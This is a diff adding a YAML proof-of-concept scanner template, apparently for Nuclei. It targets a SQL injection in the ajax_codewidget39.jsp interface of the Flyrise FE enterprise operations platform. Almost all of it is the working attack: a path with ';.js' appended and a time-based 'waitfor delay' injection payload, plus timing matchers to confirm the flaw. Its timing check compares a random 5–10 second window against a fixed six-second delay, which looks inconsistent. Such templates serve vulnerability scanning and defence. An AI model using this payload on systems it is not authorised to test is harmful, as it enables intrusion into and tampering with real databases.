@@ -1,0 +1,49 @@
+id: poc-yaml-flyrise-ajax-codewidget39-sqli
+info:
+  name: 飞企互联FE企业运营管理平台ajax_codewidget39.jsp接口存在SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in the ajax_codewidget39.jsp interface of 飞企互联FE企业运营管理平台.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /common/ajax_codewidget39.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "select_list"
+      - type: dsl
+        dsl:
+          - "duration <= 5"
+
+  - raw:
+      - |
+        GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "select_list"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
